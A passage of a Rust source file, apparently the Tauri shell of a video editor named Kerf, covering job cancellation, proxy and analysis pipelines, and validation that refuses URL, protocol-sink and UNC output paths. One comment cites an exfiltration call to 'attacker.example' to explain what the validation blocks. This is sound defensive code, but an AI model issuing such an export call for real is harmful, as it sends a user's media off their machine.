//! Tauri v2 shell for Kerf.
//!
//! Owns a single [`Project`] behind a mutex and exposes Tauri commands that
//! bridge the SvelteKit frontend to `kerf-core`. Read commands return domain
//! types; editing commands perform the mutation and return the refreshed
//! [`Timeline`] so the frontend can re-render in a single round-trip.
//!
//! **No command runs on the main thread.** A plain `#[tauri::command]` executes
//! on the main thread in Tauri v2 and would freeze the window for its duration,
//! so every quick command here is `#[tauri::command(async)]` (runs on the async
//! runtime) and every heavy one (ffmpeg decode / analysis / export, disk-bound
//! project open/save) is an `async fn` that pushes its work onto the blocking
//! thread pool via [`blocking`], resolving inputs under the shared project lock
//! and releasing it before the slow part.

mod commands;
mod editor_context;
mod gpu_preview;
mod headless;
mod mcp;
mod mcp_commands;
mod popout;
mod proxy_queue;
mod recovery;
mod settings;
mod shell;
mod thumbnail_commands;

use std::sync::atomic::{AtomicBool, AtomicU64, Ordering};
use std::sync::{Arc, Mutex};

use base64::Engine as _;
use kerf_core::{
    AssembleByTag, AssembleSummary, Asset, AssetAnalysis, AssetFileInfo, AudioEffect, BlendMode, CaptionFile, CaptionFormat,
    CaptionImportRequest, CaptionOptions, CaptionTimeBase, ClipCut, ClipMove, ClipStabilizeStatus, CutAll, Delivery, EditSource,
    ExportOptions, Filmstrip, FilmstripSheet, Fit, GapClosed, Grade, ImportOutcome, ImportSummary, Keyframe, Levels, Mask,
    MissingAsset, Page, Project, Projection, Property, PropertyKey, PropertyTrack, RangeEdit, ReframeKeyframe, RelinkCheck,
    Relinked, RemovedAsset, Revision, SpeedKey, SplitSide, Stabilize, StabilizeStatus, StagedEdit, StreamKind, SubsetApplied,
    SvgCheck, SvgLayout, SvgOverlayPatch, SvgPresetInfo, SvgPresetKind, SvgPresetParams, SvgSource, TagEdit, TagSummary, Task,
    TemplateControl, TemplateLibrary, TemplateList, TemplateSaveRequest, TemplateSaved, TextKeyframe, TimeRange, Timeline,
    TimelineDiff, TitleClipPatch, TitleClipPlacement, TitleClipResult, TitleEdited, Transition, TransitionKind, VideoEffect,
    WaveformRange,
};

use serde::Serialize;
use tauri::{AppHandle, Emitter, Manager, State};
use uuid::Uuid;

use crate::shell::Host;

#[cfg(test)]
use commands::app_settings::require_json_path;
#[cfg(test)]
use commands::media::{filmstrip_payload, playback_message, playback_session, Playbacks, PLAYBACK_HEADER_BYTES};
#[cfg(test)]
use commands::motion_templates::{require_template_path, svg_element_ids};

struct AppState {
    project: Arc<Mutex<Project>>,
    /// The stops for the long jobs (`cancel_export` and the rest): lives outside the project
    /// lock so a cancel lands even while a render holds it. Each is a [`StopEpoch`], so a stop
    /// reaches every run of that job that began before it — the GUI's and an agent's alike — and
    /// a run that begins after it starts clean; there is no flag to reset under a run about to
    /// start, which is how a Stop used to be lost.
    export_cancel: StopEpoch,
    /// Same, for the in-flight analysis pass. Analysis downloads a speech model
    /// and then transcribes for minutes, so it has to be abandonable — and the
    /// GUI runs imported assets through it one after another, which is a long
    /// commitment to make on the user's behalf without an exit.
    analysis_cancel: StopEpoch,
    /// Same, for the Mixer's loudness measurement. It holds the heavy-job lease for
    /// a whole-mix decode (minutes on a long cut), so it has to be stoppable.
    levels_cancel: StopEpoch,
    /// Same, for the sync by audio (`cancel_audio_sync`).
    sync_cancel: StopEpoch,
    /// The last sync measured and the decode it measured, so "Move anyway" applies that
    /// answer instead of decoding the same sound again.
    last_sync: Arc<Mutex<Option<(kerf_core::AudioSyncPlan, kerf_core::AudioSyncMeasure)>>>,
    /// Same, for a voiceover being synthesized (or its model downloading).
    voiceover_cancel: StopEpoch,
    /// Same, for music being composed (or its SoundFont downloading).
    music_cancel: StopEpoch,
    /// Same, for a band-balance measurement (`cancel_band_balance`).
    bands_cancel: StopEpoch,
    stems_cancel: StopEpoch,
    /// Same, for a speech model being downloaded (`cancel_model_download`).
    model_cancel: StopEpoch,
    /// Same, for a cover frame being written (`cancel_cover_export`).
    cover_cancel: StopEpoch,
    /// Same, for the shots a smart crop is sampling (`cancel_smart_crop`).
    smart_crop_cancel: StopEpoch,
    /// Same, for the cameras a stabilization analysis is measuring (`cancel_stabilization`).
    stabilize_cancel: StopEpoch,
    /// Imports run side by side, so their stop (`cancel_import`) is a count rather than a
    /// flag: it ends every import that began before it and none that begin after.
    import_stop: StopEpoch,
    /// Whether the main window has been shown. It is created hidden (`visible:
    /// false` in `tauri.conf.json`) so nobody sees the webview's unthemed first
    /// frame; the webview asks for it once the theme is applied
    /// (`show_main_window`), a timer shows it anyway if that never happens, and
    /// whichever comes first wins (`reveal_once`).
    main_window_shown: Arc<AtomicBool>,
    /// What this launch (or a second one that arrived while the webview was still
    /// booting) asked to open, held until the webview takes it
    /// (`take_launch_project`). A pull rather than an event: an event emitted
    /// before the page has a listener is lost.
    launch: Mutex<LaunchSlot>,
    /// The Preview's composited frames, cached, and the one process that draws the frames
    /// around the playhead. Shared with the GPU preview, whose JPEG route reads it too.
    scrub: Arc<kerf_core::ScrubFrames>,
}

#[derive(Serialize)]
struct AssetMetadata {
    asset: Asset,
    analysis: Option<AssetAnalysis>,
}

type CmdResult<T> = Result<T, String>;

/// A stop request for jobs that run side by side (several imports at once): [`StopEpoch::stop`]
/// reaches every job that began before it and none that begin after, so a stop never has to be
/// "reset" under a job about to start, and one press ends the whole batch.
#[derive(Clone, Default)]
struct StopEpoch(Arc<AtomicU64>);

impl StopEpoch {
    /// Note now as a job's start; the closure says whether a stop has come since.
    fn begin(&self) -> impl Fn() -> bool + Send + Sync + 'static {
        let (epoch, began) = (self.0.clone(), self.0.load(Ordering::SeqCst));
        move || epoch.load(Ordering::SeqCst) != began
    }

    fn stop(&self) {
        self.0.fetch_add(1, Ordering::SeqCst);
    }
}

/// A question that is expensive to ask (it takes the project lock), put to a poll that runs fifty
/// times a second: asked again only once `every` has passed, and once it has been answered `true`
/// it stays `true`.
pub(crate) struct Throttled<F: Fn() -> bool> {
    ask: F,
    every: std::time::Duration,
    asked_at: std::cell::Cell<Option<std::time::Instant>>,
    answer: std::cell::Cell<bool>,
}

impl<F: Fn() -> bool> Throttled<F> {
    pub(crate) fn new(every: std::time::Duration, ask: F) -> Self {
        Self {
            ask,
            every,
            asked_at: std::cell::Cell::new(None),
            answer: std::cell::Cell::new(false),
        }
    }

    pub(crate) fn ask(&self) -> bool {
        if self.answer.get() {
            return true;
        }
        if self.asked_at.get().is_some_and(|at| at.elapsed() < self.every) {
            return false;
        }
        self.asked_at.set(Some(std::time::Instant::now()));
        self.answer.set((self.ask)());
        self.answer.get()
    }
}

/// The stop for a long job begun under project `generation`: `cancel`, or the project having been
/// replaced since (an open or a new project) — a result for a project nobody has open is dropped on
/// arrival, so the ffmpeg still working towards it is not left running. The generation is read
/// under the lock at most twice a second; the closure is polled from the job's own thread.
pub(crate) fn stop_or_replaced<'a>(
    cancel: impl Fn() -> bool + 'a,
    shared: &'a Mutex<Project>,
    generation: u64,
) -> impl Fn() -> bool + 'a {
    let replaced = Throttled::new(std::time::Duration::from_millis(500), move || {
        lock_user(shared).generation() != generation
    });
    move || cancel() || replaced.ask()
}

/// Fail a job whose project was swapped out (an open or a new project) while its lock was
/// released: what it made belongs to a project that is no longer the open one. `noted` is
/// [`Project::generation`] as read under the lock the job resolved its inputs with.
pub(crate) fn require_generation(project: &Project, noted: u64, doing: &str) -> CmdResult<()> {
    if project.generation() == noted {
        Ok(())
    } else {
        Err(format!("the project was replaced while {doing}; the result was dropped"))
    }
}

/// The last step of an export that completed, for the GUI's commands and the MCP tools alike: keep the
/// source ticks the render backfilled. An asset stored without one is asked for it when a fold could use it
/// (`time_base_inputs` → `probe_time_bases`); the render did that itself, so the ask is the process's cached probe,
/// made here with **no lock held**, and only then does `lock` take the project for the one write
/// (`Project::apply_time_bases`: database only, not an edit). Whoever calls passes the timeline, assets and options the
/// render was given and the lock their surface takes. A write that fails is logged and nothing else.
pub(crate) fn keep_time_bases<G: std::ops::Deref<Target = Project>>(
    timeline: &Timeline,
    assets: &[Asset],
    opts: &ExportOptions,
    lock: impl FnOnce() -> G,
) {
    let wanted = kerf_core::time_base_inputs(timeline, assets, opts);
    if wanted.is_empty() {
        return;
    }
    store_time_bases(&kerf_core::probe_time_bases(&wanted), lock);
}

/// [`keep_time_bases`]' write: `found` under `lock`, taken only when there is something to write.
fn store_time_bases<G: std::ops::Deref<Target = Project>>(found: &[kerf_core::SourceTick], lock: impl FnOnce() -> G) {
    if found.is_empty() {
        return;
    }
    let kept = lock().apply_time_bases(found);
    match kept {
        Ok(0) => {}
        Ok(assets) => tracing::info!(assets, "kept the source time bases an export read"),
        Err(e) => tracing::warn!(error = %e, "could not keep the source time bases an export read"),
    }
}

impl AppState {
    fn new(
        project: Arc<Mutex<Project>>,
        main_window_shown: Arc<AtomicBool>,
        launch: LaunchSlot,
        scrub: Arc<kerf_core::ScrubFrames>,
    ) -> Self {
        Self {
            project,
            export_cancel: StopEpoch::default(),
            analysis_cancel: StopEpoch::default(),
            levels_cancel: StopEpoch::default(),
            sync_cancel: StopEpoch::default(),
            last_sync: Arc::new(Mutex::new(None)),
            voiceover_cancel: StopEpoch::default(),
            music_cancel: StopEpoch::default(),
            bands_cancel: StopEpoch::default(),
            stems_cancel: StopEpoch::default(),
            model_cancel: StopEpoch::default(),
            cover_cancel: StopEpoch::default(),
            smart_crop_cancel: StopEpoch::default(),
            stabilize_cancel: StopEpoch::default(),
            import_stop: StopEpoch::default(),
            main_window_shown,
            launch: Mutex::new(launch),
            scrub,
        }
    }

    fn project(&self) -> std::sync::MutexGuard<'_, Project> {
        lock_user(&self.project)
    }

    /// An analysis run is starting: hand back what says whether `cancel_analysis` has been pressed
    /// since, for the run to poll. The GUI's `analyze_asset` does this; the MCP `analyze_asset`
    /// takes it the same way and combines it with its own cancellation, so the GUI's Stop ends an
    /// agent's analysis too — and a Stop pressed just before another run starts is not undone by it.
    pub(crate) fn begin_analysis(&self) -> impl Fn() -> bool + Send + Sync + 'static {
        self.analysis_cancel.begin()
    }

    /// A speech-model download is starting; the closure says whether `cancel_model_download` has
    /// been pressed since. The GUI's download and an agent's alike take one.
    pub(crate) fn begin_model_download(&self) -> impl Fn() -> bool + Send + Sync + 'static {
        self.model_cancel.begin()
    }

    /// A cover frame is being written; the closure says whether `cancel_cover_export` has been
    /// pressed since. The GUI's export and an agent's alike take one.
    pub(crate) fn begin_cover_export(&self) -> impl Fn() -> bool + Send + Sync + 'static {
        self.cover_cancel.begin()
    }

    /// An import is starting; the closure says whether `cancel_import` has been pressed since.
    pub(crate) fn begin_import(&self) -> impl Fn() -> bool + Send + Sync + 'static {
        self.import_stop.begin()
    }

    /// A voiceover is being synthesized; the closure says whether `cancel_voiceover` has been pressed
    /// since. The GUI's voiceover dialog and an agent's `generate_voiceover` take one alike.
    pub(crate) fn begin_voiceover(&self) -> impl Fn() -> bool + Send + Sync + 'static {
        self.voiceover_cancel.begin()
    }

    /// Music is being composed; the closure says whether `cancel_music` has been pressed since. The
    /// GUI's Compose dialog and an agent's `compose_music` take one alike.
    pub(crate) fn begin_music(&self) -> impl Fn() -> bool + Send + Sync + 'static {
        self.music_cancel.begin()
    }

    /// A stem separation is starting; the closure says whether `cancel_stems` has been pressed since.
    pub(crate) fn begin_stems(&self) -> impl Fn() -> bool + Send + Sync + 'static {
        self.stems_cancel.begin()
    }

    /// A smart crop is sampling; the closure says whether `cancel_smart_crop` has been pressed since.
    pub(crate) fn begin_smart_crop(&self) -> impl Fn() -> bool + Send + Sync + 'static {
        self.smart_crop_cancel.begin()
    }

    /// A stabilization analysis is measuring; the closure says whether `cancel_stabilization` has been
    /// pressed since. The GUI's analysis and an agent's `stabilize_clip` take one alike.
    pub(crate) fn begin_stabilize(&self) -> impl Fn() -> bool + Send + Sync + 'static {
        self.stabilize_cancel.begin()
    }

    /// A render is starting (a single export or a multi-format one); the closure says whether
    /// `cancel_export` has been pressed since.
    pub(crate) fn begin_export(&self) -> impl Fn() -> bool + Send + Sync + 'static {
        self.export_cancel.begin()
    }

    /// Press every Stop at once: every long job running now ends (a headless run shutting down).
    fn stop_all(&self) {
        for stop in [
            &self.export_cancel,
            &self.analysis_cancel,
            &self.levels_cancel,
            &self.sync_cancel,
            &self.voiceover_cancel,
            &self.music_cancel,
            &self.bands_cancel,
            &self.stems_cancel,
            &self.model_cancel,
            &self.cover_cancel,
            &self.smart_crop_cancel,
            &self.stabilize_cancel,
            &self.import_stop,
        ] {
            stop.stop();
        }
    }
}

/// Lock the shared project for a GUI command, attributing edits to the user;
/// the MCP server attributes its own edits to the agent under the same lock
/// (see `mcp::KerfMcp::lock`). Recovers from a poisoned mutex (a panic while
/// another op held it) rather than failing every command for the rest of the
/// session.
pub(crate) fn lock_user(project: &Mutex<Project>) -> std::sync::MutexGuard<'_, Project> {
    let mut guard = project.lock().unwrap_or_else(|e| e.into_inner());
    guard.set_actor(EditSource::User);
    guard
}

/// Run a blocking (ffmpeg / disk) job on the blocking thread pool and await it.
/// Commands doing heavy work must go through this: a plain command body runs on
/// the main thread (freezing the window) and an `async` one on the shared tokio
/// workers (starving the MCP server), while the blocking pool grows on demand.
async fn blocking<T: Send + 'static>(job: impl FnOnce() -> CmdResult<T> + Send + 'static) -> CmdResult<T> {
    tauri::async_runtime::spawn_blocking(job).await.map_err(|e| e.to_string())?
}

/// Parse the id a command was handed, naming the argument in the error: a bare "invalid
/// character" says nothing about which of a command's several ids was wrong.
fn id(s: &str, arg: &str) -> CmdResult<Uuid> {
    Uuid::parse_str(s).map_err(|e| {
        let shown: String = s.chars().take(64).collect();
        format!("invalid {arg} {shown:?}: not an id ({e})")
    })
}

/// [`id`] for an argument that may be left out.
fn opt_id(s: Option<&str>, arg: &str) -> CmdResult<Option<Uuid>> {
    s.map(|s| id(s, arg)).transpose()
}

/// [`id`] for a list of ids; the error names the entry (`clip_ids[2]`).
fn ids(list: &[String], arg: &str) -> CmdResult<Vec<Uuid>> {
    list.iter().enumerate().map(|(i, s)| id(s, &format!("{arg}[{i}]"))).collect()
}

fn kind(s: &str) -> CmdResult<StreamKind> {
    match s.to_lowercase().as_str() {
        "video" => Ok(StreamKind::Video),
        "audio" => Ok(StreamKind::Audio),
        other => Err(format!("invalid track kind '{other}'; expected \"video\" or \"audio\"")),
    }
}

/// Build a `Transition` from a kind string + duration, or `None` to clear it.
fn parse_transition(kind: Option<String>, duration: Option<f64>) -> CmdResult<Option<Transition>> {
    match kind {
        None => Ok(None),
        Some(k) => {
            let kind = TransitionKind::parse(&k).ok_or_else(|| {
                format!(
                    "invalid transition kind '{k}'; expected one of {}",
                    TransitionKind::wire_names()
                )
            })?;
            let duration = duration.ok_or("transition duration is required")?;
            Ok(Some(Transition { kind, duration }))
        }
    }
}

/// Kerf's own directories an output must never be written into: the settings (which hold the agent
/// token) and their backups, and the logs. Filled once at startup ([`set_app_dirs`]).
static APP_DIRS: std::sync::OnceLock<Vec<(std::path::PathBuf, String)>> = std::sync::OnceLock::new();

fn set_app_dirs(app: &impl Host) {
    let mut dirs = Vec::new();
    if let Some(config) = app.config_dir() {
        dirs.push((config, "Kerf's settings".to_string()));
    }
    if let Some(logs) = log_dir_path(app) {
        dirs.push((logs, "Kerf's logs".to_string()));
    }
    let _ = crate::APP_DIRS.set(dirs);
}

/// `output` against what the project protects (a source, a capture, a proxy, the project's own file,
/// the cache) **and Kerf's own settings and logs**: the checks every export, cover, subtitle file and
/// Save As make, with the lock released (this canonicalises and stats).
pub(crate) fn check_output(output: &std::path::Path, protected: &kerf_core::paths::Protected) -> kerf_core::Result<()> {
    let mut all = protected.clone();
    all.dirs.extend(APP_DIRS.get().into_iter().flatten().cloned());
    Project::check_output_path_with(output, &all)
}

/// Reject a caller-supplied output path that names an ffmpeg protocol sink
/// (`rtmp://…`, `http://…`, `pipe:1`, `concat:a|b`, …) instead of a plain
/// local file, and require it be absolute. ffmpeg resolves the protocol (and
/// a relative path resolves) from the string alone with no local file ever
/// written to look suspicious — this is what stops
/// `export(output_path="https://attacker.example/upload")` from making Kerf's
/// own ffmpeg stream the timeline off the machine.
///
/// A single ASCII letter immediately before a `:` that is followed by `\` or
/// `/` is a Windows drive letter (`C:\Users\...`), not a protocol scheme —
/// ffmpeg itself special-cases this the same way, so it is let through.
///
/// A **network path** is refused for a path an agent supplies (`\\host\share\out.mp4` and the
/// mixed forms Windows reads the same way, `\\?\UNC\…`): opening one makes the machine
/// authenticate to whatever host the string names, and a render may not be sent off the machine
/// this way. Only the verbatim form of a local drive (`\\?\C:\...`) starts with two separators and
/// is let through. `//host/share` is a network path **on Windows only**: on macOS and Linux
/// `//tmp/out.mp4` is `/tmp/out.mp4`. The device namespace (`\\.\pipe\…`) is never an output.
pub(crate) fn require_local_output_path(path: &str) -> Result<(), String> {
    check_output_path(path, PathSource::Agent, cfg!(windows))
}

/// [`require_local_output_path`] for a path the user picked in Kerf's own save dialog: a network
/// share they chose (`\\nas\share\out.mp4`) is their intent, so on Windows a UNC path passes. URLs,
/// protocol sinks, relative paths and the device namespace are refused all the same.
pub(crate) fn require_user_output_path(path: &str) -> Result<(), String> {
    check_output_path(path, PathSource::User, cfg!(windows))
}

/// Who named a path: the user, in a dialog, or an agent, in a tool call.
#[derive(Clone, Copy, PartialEq, Eq)]
pub(crate) enum PathSource {
    User,
    Agent,
}

/// `\\?\C:\`: the verbatim spelling of a drive, which is local.
fn is_verbatim_drive(bytes: &[u8]) -> bool {
    let separator = |at: usize| bytes.get(at).is_some_and(|b| matches!(b, b'\\' | b'/'));
    separator(0)
        && separator(1)
        && bytes.get(2) == Some(&b'?')
        && separator(3)
        && bytes.get(4).is_some_and(u8::is_ascii_alphabetic)
        && bytes.get(5) == Some(&b':')
        && separator(6)
}

/// Whether `path` names a network share or the device namespace: `Some(true)` for a device
/// (`\\.\pipe\…`, `\\?\GLOBALROOT\…`), `Some(false)` for a UNC path (`\\host\share`, `\\?\UNC\…`,
/// and `//host/share` on Windows). `//host/share` is an ordinary absolute path elsewhere; the
/// verbatim spelling of a local drive is local.
fn network_path(path: &str, windows: bool) -> Option<bool> {
    let bytes = path.as_bytes();
    let separator = |at: usize| bytes.get(at).is_some_and(|b| matches!(b, b'\\' | b'/'));
    if !(separator(0) && separator(1)) || is_verbatim_drive(bytes) {
        return None;
    }
    let backslashed = bytes[0] == b'\\' || bytes[1] == b'\\';
    if !(backslashed || windows) {
        return None;
    }
    let normal = path.replace('\\', "/");
    Some(normal.starts_with("//./") || (normal.starts_with("//?/") && !normal[4..].to_ascii_uppercase().starts_with("UNC/")))
}

/// [`require_local_output_path`] for a file an agent asks Kerf to read: opening a network path makes
/// the machine authenticate to whatever host the string names, so UNC and device-namespace paths
/// are refused **before any filesystem call**, on every surface an agent names a file through.
pub(crate) fn require_local_input_path(path: &str) -> Result<(), String> {
    check_input_path(path, cfg!(windows))
}

/// The rule of [`require_local_input_path`], with the platform a parameter so every spelling is
/// tested everywhere.
pub(crate) fn check_input_path(path: &str, windows: bool) -> Result<(), String> {
    match network_path(path, windows) {
        Some(_) => Err(format!(
            "{path:?} is a network (UNC) or device path; copy the file to a local drive and import it from there"
        )),
        None => Ok(()),
    }
}

/// The rules of [`require_local_output_path`] and [`require_user_output_path`], with the platform
/// a parameter so every spelling is tested everywhere.
pub(crate) fn check_output_path(path: &str, source: PathSource, windows: bool) -> Result<(), String> {
    if let Some(colon) = path.find(':') {
        let scheme = &path[..colon];
        let after = &path[colon + 1..];
        let is_drive_letter =
            scheme.len() == 1 && scheme.chars().all(|c| c.is_ascii_alphabetic()) && after.starts_with(['\\', '/']);
        let looks_like_scheme = !scheme.is_empty()
            && scheme.chars().next().is_some_and(|c| c.is_ascii_alphabetic())
            && scheme
                .chars()
                .all(|c| c.is_ascii_alphanumeric() || matches!(c, '+' | '-' | '.'));
        if looks_like_scheme && !is_drive_letter {
            return Err(format!(
                "output path {path:?} looks like a URL or ffmpeg protocol sink, not a local file path"
            ));
        }
    }
    if let Some(device) = network_path(path, windows) {
        if device || source == PathSource::Agent || !windows {
            return Err(format!(
                "output path {path:?} is a network (UNC) or device path; save to a local drive instead"
            ));
        }
        // A share the user chose in the save dialog.
        return Ok(());
    }
    let bytes = path.as_bytes();
    let verbatim_drive = is_verbatim_drive(bytes);
    let is_windows_absolute =
        bytes.len() >= 3 && bytes[0].is_ascii_alphabetic() && bytes[1] == b':' && matches!(bytes[2], b'\\' | b'/');
    if !(path.starts_with('/') || verbatim_drive || is_windows_absolute) {
        return Err(format!("output path {path:?} must be an absolute local file path"));
    }
    Ok(())
}

/// Remember which project is open now: `Some(path)` goes to the front of the recent list and is
/// the one a launch with "reopen the last project" opens; `None` is a new project with no file,
/// which leaves nothing to reopen. Used by every way a project becomes the open one, the MCP
/// server's included. A list that cannot be written is not worth failing the open for; touches
/// the disk, so call it off the main thread.
pub(crate) fn note_open(app: &impl Host, path: Option<&str>) {
    // A headless run is not what the desktop's recent list and reopen are about.
    if app.headless() {
        return;
    }
    if let Err(e) = settings::record_open(app, path) {
        tracing::warn!(error = %e, "could not record the open project");
    }
}

/// Progress of a slow import (an Insta360 lens pair being stitched), tagged with
/// the file the user picked so the UI can label it while several import at once.
#[derive(Clone, serde::Serialize)]
pub(crate) struct ImportProgress {
    path: String,
    fraction: f64,
    elapsed_secs: f64,
    eta_secs: Option<f64>,
}

impl ImportProgress {
    /// Tag a render-progress tick with the file it belongs to. Shared with the
    /// MCP `import_asset` tool so an agent's import reports on the same event
    /// and drives the same overlay the user's own import does.
    pub(crate) fn new(path: &str, p: kerf_core::ExportProgress) -> Self {
        Self {
            path: path.to_string(),
            fraction: p.fraction,
            elapsed_secs: p.elapsed_secs,
            eta_secs: p.eta_secs,
        }
    }
}

/// What the webview is told about an asset's proxy: the `proxy-progress` event, on every
/// change (queued, each percent of a build, ready, failed), and `proxy-ready` once one
/// lands so the preview re-decodes the current frame from it.
pub(crate) fn proxy_notifier(app: &impl Host) -> kerf_core::proxy::Notify {
    let app = app.clone();
    Arc::new(move |status: &kerf_core::ProxyStatus| {
        if let Err(e) = app.send("proxy-progress", status) {
            tracing::warn!(error = %e, "failed to emit proxy-progress");
        }
        if status.state == kerf_core::ProxyPhase::Ready {
            if let Err(e) = app.send("proxy-ready", ()) {
                tracing::warn!(error = %e, "failed to emit proxy-ready");
            }
        }
    })
}

/// Queue an asset's preview proxy (all-intra, downscaled) for background generation so
/// scrubbing decodes one keyframe instead of seeking a long GOP. Previews fall back to
/// the original source until it lands (`proxy-progress` says how far it is, `proxy-ready`
/// that it is there). A still, an audio-only file, an asset whose proxy was deleted on
/// purpose and one that already has a proxy are skipped, and so is everything while
/// proxies are off or the preview source is the original.
///
/// The proxy takes its place in front of analysis in the heavy-job queue **before this
/// returns** (`kerf_core::proxy`), which is why imports call it before the webview can
/// start analysing what they brought in. It may run an `ffprobe` (cached) the first time
/// per file: call it from the blocking pool, never from an async task.
pub(crate) fn spawn_proxy(app: &impl Host, asset: &Asset) {
    let declined = app
        .managed::<AppState>()
        .and_then(|state| state.project().proxy_declined(asset.id).ok())
        .unwrap_or(false);
    let input = kerf_core::ProxyInput {
        asset: asset.clone(),
        declined,
    };
    kerf_core::proxy::queue_auto(&input, proxy_notifier(app));
}

/// [`spawn_proxy`] for every asset of the open project, off the calling thread (a project
/// can hold hundreds of them and each may need its probe): what a changed proxy size or
/// preview source asks for.
fn respawn_proxies(app: &impl Host) {
    let app = app.clone();
    std::thread::spawn(move || {
        let (assets, generation) = match app.managed::<AppState>() {
            Some(state) => {
                let project = state.project();
                (project.list_assets().unwrap_or_default(), project.generation())
            }
            None => return,
        };
        for asset in &assets {
            // Another project opened meanwhile: these are not its assets.
            let current = app
                .managed::<AppState>()
                .is_some_and(|state| state.project().generation() == generation);
            if !current {
                return;
            }
            spawn_proxy(&app, asset);
        }
    });
}

/// Build an asset's proxy again from the original: the one it has (and any being built) is
/// dropped first, and a proxy the user had deleted is wanted again — but only once the rebuild
/// was accepted (proxies off, or a file that needs none, refuse it and change nothing).
/// Returns where the new build starts; `proxy-progress` follows it. `lock` is how the caller
/// takes the project (the GUI as the user, the MCP server as the agent).
pub(crate) fn rebuild_proxy_now<'a>(
    app: &impl Host,
    lock: &dyn Fn() -> std::sync::MutexGuard<'a, Project>,
    asset_id: Uuid,
) -> CmdResult<kerf_core::ProxyStatus> {
    build_proxy_now(app, lock, asset_id, kerf_core::proxy::rebuild, "its proxy was being rebuilt")
}

/// [`rebuild_proxy_now`]'s shape for any manual build: resolve the asset under the lock, ask
/// `build` (`proxy::rebuild`, `proxy::build_next`) with it released, and clear the deleted-proxy mark
/// only once the core accepted the build. `doing` completes "the project was replaced while ...".
pub(crate) fn build_proxy_now<'a>(
    app: &impl Host,
    lock: &dyn Fn() -> std::sync::MutexGuard<'a, Project>,
    asset_id: Uuid,
    build: fn(&Asset, kerf_core::proxy::Notify) -> kerf_core::Result<kerf_core::ProxyStatus>,
    doing: &str,
) -> CmdResult<kerf_core::ProxyStatus> {
    let (asset, generation) = {
        let project = lock();
        (
            project.require_asset(asset_id).map_err(|e| e.to_string())?,
            project.generation(),
        )
    };
    let status = build(&asset, proxy_notifier(app)).map_err(|e| e.to_string())?;
    let project = lock();
    require_generation(&project, generation, doing)?;
    project.set_proxy_declined(asset_id, false).map_err(|e| e.to_string())?;
    Ok(status)
}

/// Delete an asset's proxy files at every size and stop any build of them; the proxy is not
/// made again by itself until it is rebuilt. Returns the bytes freed and the new status.
pub(crate) fn delete_proxy_now<'a>(
    app: &impl Host,
    lock: &dyn Fn() -> std::sync::MutexGuard<'a, Project>,
    asset_id: Uuid,
) -> CmdResult<(u64, kerf_core::ProxyStatus)> {
    let input = {
        let project = lock();
        project.set_proxy_declined(asset_id, true).map_err(|e| e.to_string())?;
        project.proxy_input(asset_id).map_err(|e| e.to_string())?
    };
    let freed = kerf_core::proxy::delete(&input.asset);
    let status = kerf_core::proxy::status(&input);
    if let Err(e) = app.send("proxy-progress", &status) {
        tracing::warn!(error = %e, "failed to emit proxy-progress");
    }
    // Previews that were decoding the proxy decode the original from here on.
    if let Err(e) = app.send("proxy-ready", ()) {
        tracing::warn!(error = %e, "failed to emit proxy-ready");
    }
    Ok((freed, status))
}

/// One step of an analysis pass, tagged with the asset it belongs to so the bin can badge
/// the right row when several assets are analyzed at once.
#[derive(Serialize, Clone)]
struct AnalysisProgressEvent {
    asset_id: String,
    stage: String,
    fraction: Option<f64>,
    detail: Option<String>,
}

/// What an analysis run left behind.
pub(crate) struct AnalysisOutcome {
    /// The cached analysis after the run (the steps that finished merged in).
    pub analysis: AssetAnalysis,
    pub status: kerf_core::AnalysisStatus,
    /// Steps that failed, with why — the rest of the run still landed.
    pub failed: Vec<(kerf_core::AnalysisKind, String)>,
}

/// Run analysis `steps` (the default set when `None`) on an asset and cache what they find.
///
/// The one path the GUI command and the MCP tool share, so both stream `analysis-progress`
/// (the step, with a fraction where it has one) and `analysis-status` (the per-kind state,
/// which the bin's chips draw), and both follow the same rules: the heavy work runs with
/// the project lock released; **each step that finishes is merged into the cached analysis
/// at once** (without touching the other kinds), so its chip turns done and its markers appear
/// while the slower steps still run; a step that was cancelled or failed caches nothing.
/// Steps wait their turn behind exports and preview proxies, say so (`waiting`), and can be
/// stopped while queued. A run in which every step failed is an error; a partial failure is
/// not (it is in the outcome and the status). `lock` is how the caller takes the project: the
/// GUI as the user, the MCP server as the agent (which also stamps its activity).
pub(crate) fn run_analysis<'a>(
    app: &impl Host,
    lock: &dyn Fn() -> std::sync::MutexGuard<'a, Project>,
    asset_id: Uuid,
    steps: Option<&[kerf_core::AnalysisKind]>,
    cancel: &dyn Fn() -> bool,
) -> CmdResult<AnalysisOutcome> {
    let (asset, stored, generation) = {
        let project = lock();
        (
            project.require_asset(asset_id).map_err(|e| e.to_string())?,
            project.get_analysis(asset_id).map_err(|e| e.to_string())?,
            project.generation(),
        )
    };
    // What is cached as of now: it grows with each finished step, and the status reads it.
    let current = std::cell::RefCell::new(stored);
    let emit_status = || {
        let _ = app.send(
            "analysis-status",
            kerf_core::analysis_status(asset_id, current.borrow().as_ref()),
        );
    };
    let id_text = asset_id.to_string();
    // Analysis is no longer a short opaque wait: the first transcription downloads a speech
    // model and then runs inference for minutes, so each step is streamed to the webview
    // rather than hidden behind a spinner.
    let mut on_progress = |p: kerf_core::AnalysisProgress| {
        let _ = app.send(
            "analysis-progress",
            AnalysisProgressEvent {
                asset_id: id_text.clone(),
                stage: p.stage.clone(),
                fraction: p.fraction,
                detail: p.detail,
            },
        );
        // A step starting is the running chip; a model download is part of its step.
        if !matches!(p.stage.as_str(), "waiting" | "download_model" | "done") && p.fraction.is_none() {
            emit_status();
        }
    };
    let mut on_step = |so_far: &AssetAnalysis| {
        let project = lock();
        // A step that finished for a project that is no longer open is not cached in this one.
        if project.generation() != generation {
            return;
        }
        match project.merge_analysis(so_far) {
            Ok(merged) => {
                drop(project);
                *current.borrow_mut() = Some(merged);
                emit_status();
            }
            // The final merge below tries again and reports it.
            Err(e) => tracing::warn!(error = %e, "could not cache a finished analysis step"),
        }
    };
    // A project opened (or started) while the steps run makes the rest of the run pointless — its
    // result is dropped below — so the running ffmpeg is stopped too, not left to finish the machine's
    // time on a file nobody has open any more. The generation is asked of the project (a lock) at most
    // twice a second.
    let replaced = Throttled::new(std::time::Duration::from_millis(500), || lock().generation() != generation);
    let stop = || cancel() || replaced.ask();
    let run = kerf_core::analyze_asset_steps(&asset, steps, &mut on_progress, &mut on_step, &stop).map_err(|e| e.to_string())?;
    let merged = {
        let project = lock();
        // The project was replaced while the steps ran: nothing of this run belongs in the new one,
        // and the person who opened it knows (the same quiet stop as a cancel).
        if project.generation() != generation {
            return Err(ANALYSIS_CANCELLED.to_string());
        }
        project.merge_analysis(&run.patch).map_err(|e| e.to_string())?
